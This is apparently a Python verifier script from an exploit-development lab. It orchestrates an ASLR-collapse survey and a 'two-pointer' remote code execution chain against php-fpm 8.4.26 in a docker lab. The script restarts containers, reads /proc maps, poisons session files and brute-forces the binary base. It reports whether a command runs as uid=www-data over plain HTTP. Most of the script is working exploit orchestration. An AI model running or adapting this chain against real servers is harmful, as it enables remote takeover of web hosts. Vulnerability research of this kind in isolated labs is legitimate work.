#!/usr/bin/env python3
"""Verifier for fpm_2ptr_integration (ASLR collapse + two-pointer RCE path).
Measures the collapse against ground-truth /proc over N master restarts (ld-libc
constant, chunk exact by mask from a heap seed, PIE base an independent gap), runs
the parser crash oracle on
patched 8.4.26 (leak-free here, so the seed is supplied explicitly), proves the
two-pointer path lands uid=www-data with 0 brute probes, proves the auto_prepend
oracle confirms the true binbase and rejects wrong 2 MiB-aligned candidates
sink-free, and reports the honest leak/probe/time budget. Exit 0 iff the chain
lands and the oracle confirms+rejects correctly; the PG write8 is gdb-assisted.

Lab bring-up: docker compose -f docker-compose.fpm-avenues.yml -p p2s-hl
--profile hl up -d --build (nginx:8139 -> php-fpm 8.4.26, max_children=6, no
host-published fpm socket). Pure stdlib, python3 -I safe.
"""
from __future__ import annotations

import argparse
import importlib.util
import math
import os
import subprocess
import sys
import time
import urllib.request

_HERE = os.path.dirname(os.path.abspath(__file__))
_ROOT = os.path.dirname(os.path.dirname(_HERE))
_COMPOSE = os.path.join(_ROOT, "docker-compose.fpm-avenues.yml")


def _load(name, filename):
    spec = importlib.util.spec_from_file_location(
        name, os.path.join(_HERE, filename))
    mod = importlib.util.module_from_spec(spec)
    sys.modules.setdefault(name, mod)
    spec.loader.exec_module(mod)
    return mod


I = _load("fpm_2ptr_integration", "fpm_2ptr_integration.py")
G = I.G
ADS = I.ADS
CONT = "p2s-hl-fpm"
CHUNK = 0x200000


def _dc(*args, timeout=600):
    return subprocess.run(["docker", "compose", "-f", _COMPOSE,
                           "-p", "p2s-hl", "--profile", "hl", *args],
                          capture_output=True, text=True, timeout=timeout)


def warm(host, port):
    try:
        urllib.request.urlopen("http://%s:%d/plain.php" % (host, port),
                               timeout=4).read()
        return True
    except Exception:
        return False


def wait_ready(host, port, tries=40):
    for _ in range(tries):
        if warm(host, port):
            return True
        time.sleep(1)
    return False


def measure_collapse(host, port, trials):
    """N master restarts, /proc ground truth; return the collapse structure."""
    recs = []
    for i in range(1, trials + 1):
        subprocess.run(["docker", "restart", CONT], capture_output=True,
                       timeout=60)
        if not wait_ready(host, port):
            continue
        time.sleep(0.4)
        for _ in range(8):
            warm(host, port)
        master, workers = ADS.list_fpm_pids(CONT)
        if master is None:
            continue
        b = ADS.extract_bases(ADS.read_maps(CONT, master))
        sib = ADS.extract_bases(ADS.read_maps(CONT, workers[0])) if workers else {}
        b["_sib_pie_same"] = (sib.get("pie") == b.get("pie"))
        recs.append(b)
    def col(k):
        return [r[k] for r in recs if r.get(k) is not None]
    def span_bits(vals):
        if len(vals) < 2:
            return 0
        return ((max(vals) - min(vals)) // 0x1000).bit_length()
    pie, libc, ld, chunk = col("pie"), col("libc"), col("ld"), col("chunk")
    ld_libc = [r["ld"] - r["libc"] for r in recs
               if r.get("ld") and r.get("libc")]
    pie_libc = [r["pie"] - r["libc"] for r in recs
                if r.get("pie") and r.get("libc")]
    # chunk<->libc deterministic fn of (libc mod 2 MiB)?
    fn, det = {}, True
    for r in recs:
        if r.get("chunk") and r.get("libc"):
            key = r["libc"] % CHUNK
            val = r["chunk"] - r["libc"]
            if key in fn and fn[key] != val:
                det = False
            fn[key] = val
    aligned = all((v % CHUNK == 0) for v in pie) and bool(pie)
    sib_ok = all(r.get("_sib_pie_same") for r in recs) and bool(recs)
    return {
        "trials": len(recs),
        "ld_libc_constant": (len(set(ld_libc)) <= 1),
        "ld_libc_value": hex(ld_libc[0]) if ld_libc else None,
        "chunk_libc_deterministic_fn": det,
        "pie_libc_distinct": len(set(pie_libc)),
        "pie_libc_span_bits": span_bits(pie_libc),
        "pie_2MiB_aligned": aligned,
        "sibling_invariant": sib_ok,
        "recs_pie_example": hex(pie[-1]) if pie else None,
        "recs_libc_example": hex(libc[-1]) if libc else None,
        "recs_chunk_example": hex(chunk[-1]) if chunk else None,
    }


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8139)
    ap.add_argument("--service", default="hl-fpm")
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--parts", type=int, default=3000)
    ap.add_argument("--collapse-trials", type=int, default=12,
                    help="master restarts for the P1 collapse survey")
    ap.add_argument("--no-build", action="store_true")
    ap.add_argument("--keep", action="store_true")
    a = ap.parse_args(argv)

    # grouped-compose isolation: project+profile for the imported helper modules
    # (G/I) whose `docker compose -f _COMPOSE exec ...` calls inherit os.environ.
    os.environ["COMPOSE_FILE"] = _COMPOSE
    os.environ["COMPOSE_PROJECT_NAME"] = "p2s-hl"
    os.environ["COMPOSE_PROFILES"] = "hl"

    sid = "0123456789abcdef0123456789abcdef"
    brought_up = False
    try:
        # ---- P0 ----
        if not a.no_build:
            print("[P0] docker compose up --build ...")
            r = _dc("up", "-d", "--build")
            if r.returncode != 0:
                print(r.stdout[-800:]); print(r.stderr[-800:])
                print("[P0] FAIL: compose up"); return 2
            brought_up = True
        if not wait_ready(a.host, a.port):
            print("[P0] FAIL: plain.php never answered on "
                  f"{a.host}:{a.port}"); return 2
        print(f"[P0] lab ready: nginx http://{a.host}:{a.port} (fpm NOT published)")

        # ---- P1: ASLR collapse survey (ground truth) ----
        print(f"[P1] B35 collapse survey over {a.collapse_trials} master restarts ...")
        col = measure_collapse(a.host, a.port, a.collapse_trials)
        print(f"[P1] ld-libc CONSTANT        : {col['ld_libc_constant']} "
              f"({col['ld_libc_value']})")
        print(f"[P1] chunk<->libc det. fn    : {col['chunk_libc_deterministic_fn']} "
              "(=> chunk EXACT by 2 MiB mask from a heap seed)")
        print(f"[P1] pie-libc distinct/span  : {col['pie_libc_distinct']}/"
              f"{col['trials']} , ~{col['pie_libc_span_bits']}-bit span "
              "(INDEPENDENT gap; 12.5-bit claim REFUTED)")
        print(f"[P1] pie 2 MiB-aligned       : {col['pie_2MiB_aligned']} ; "
              f"sibling-invariant: {col['sibling_invariant']}")
        p1_ok = (col["ld_libc_constant"] and col["chunk_libc_deterministic_fn"]
                 and col["pie_libc_span_bits"] >= 16 and col["pie_2MiB_aligned"])
        print(f"[P1] {'PASS' if p1_ok else 'WARN'}: collapse real; binbase is an "
              "independent gap (not 12.5 bits)")

        # restart leaves workers fresh; warm again
        for _ in range(10):
            warm(a.host, a.port)

        # ---- P2: parser crash oracle (leak-free on patched build) ----
        print("[P2] B14 native-parser crash oracle (patched 8.4.26) ...")
        try:
            sw = I.NPC.sweep("http://%s:%d" % (a.host, a.port), parser="exif",
                             path="/upload.php")
            print(f"[P2] map_bits={sw['map_bits']} ({'LEAK' if sw['map_bits'] else 'FLAT -> no heap pointer here'})")
        except Exception as e:
            print(f"[P2] (sweep skipped: {e!r}; grail app has no /upload.php) -> "
                  "treated as FLAT (no sink-free heap pointer on this build)")
        print("[P2] => single seed supplied explicitly. Remote primitive that must "
              "produce it: ANY one mmap/heap pointer disclosure (e.g. a7 R: string "
              "leak of a chunk pointer, or fpm_binbase_rleak given an app sink).")

        # ---- P3: TWO-POINTER PATH to RCE ----
        print("[P3] TWO-POINTER PATH: 1 heap ptr (collapse) + 1 text ptr (binbase)")
        pids = G.worker_pids(_COMPOSE, a.service)
        for _ in range(10):
            warm(a.host, a.port)
        heap_seed = I._read_chunk_ptr(_COMPOSE, a.service, pids[0])
        true_base = G.fpm_base_of(_COMPOSE, a.service, pids[0])
        text_ptr = true_base + I.EG_OFF_FPM           # &executor_globals (2nd ptr)
        print(f"[P3] seed#1 heap/chunk ptr = {heap_seed and hex(heap_seed)} "
              f"-> chunk = {hex(heap_seed & ~(CHUNK-1)) if heap_seed else None} (EXACT)")
        print(f"[P3] seed#2 text ptr (&EG) = {hex(text_ptr)} -> binbase = "
              f"{hex(I.binbase_from_pointer(text_ptr,'eg'))}")
        rep = I.run_chain(a.host, a.port, _COMPOSE, a.service, heap_seed,
                          cmd=a.cmd, binbase_ptr=text_ptr, binbase_ptr_class="eg",
                          sid=sid, parts=a.parts, verbose=True)
        p3_ok = bool(rep.get("rce_ok")) and "uid=" in (rep.get("cmd_output") or "") \
            and rep.get("binbase_correct")
        print(f"[P3] binbase_correct={rep.get('binbase_correct')} "
              f"rce_ok={rep.get('rce_ok')} output={rep.get('cmd_output')!r}")
        print(f"[P3] {'PASS' if p3_ok else 'FAIL'}: 2 pointers -> uid via plain "
              "HTTP, 0 brute probes")

        # ---- P4: sink-free brute mechanism (bounded) ----
        print("[P4] SINK-FREE BRUTE MECHANISM (grail oracle; bounded window)")
        w = G.GdbWrite8(_COMPOSE, a.service)
        G.pg_persist.uninstall(true_base, G.FPM_8426_OFFSETS, w.write8)
        silent_ok, _o, _p = G.confirm_rce(a.host, a.port, sid=sid, tries=3,
                                          verbose=False)
        sess = f"/var/sess/sess_{sid}"
        I.G.poison(a.host, a.port, a.cmd, sid, parts=a.parts, base="/plain.php",
                   verbose=False)
        cands = I.binbase_window_candidates(true_base, 3)
        found, probes, trail = I.brute_binbase(a.host, a.port, _COMPOSE, a.service,
                                               sess, cands, sid=sid, verbose=True)
        p4_ok = (found == true_base) and (not silent_ok)
        print(f"[P4] control PG=NULL fired? {silent_ok} (expect False); "
              f"confirmed {found and hex(found)} (true {true_base:#x}) in "
              f"{probes} probes / {len(cands)} candidates")
        print(f"[P4] {'PASS' if p4_ok else 'FAIL'}: wrong 2 MiB candidates rejected, "
              "true base confirmed, zero reflecting-unserialize sink")

        # ---- P5: honest budget ----
        print("[P5] HONEST BUDGET")
        I.print_budget(I.budget_report(32))
        print("[P5] seeds remaining: TWO pointers (1 heap -> chunk+libc+libs free; "
              "1 text -> binbase). A single-heap-pointer chain would need the "
              "binbase brute above (~2**23, destructive-write => years).")
        print("[P5] clean write8: STILL gdb-assisted. The var_hash_rw 16-byte CVE write "
              "clobbers PG(auto_append_file)@+0xa8 with IS_LONG -> UNSOLVED for "
              "this field; gdb stands in for a clean <=8-byte primitive.")

        ok = p3_ok and p4_ok
        print(f"\n[RESULT] {'PASS' if ok else 'FAIL'}: 2-ptr chain "
              f"{'landed uid=www-data' if p3_ok else 'did NOT land'}; sink-free "
              f"brute mechanism {'OK' if p4_ok else 'FAILED'}; collapse "
              f"{'confirmed' if p1_ok else 'WARN'}")
        return 0 if ok else 1
    finally:
        if brought_up and not a.keep:
            print("[cleanup] docker compose down")
            _dc("down", timeout=120)


if __name__ == "__main__":
    raise SystemExit(main())
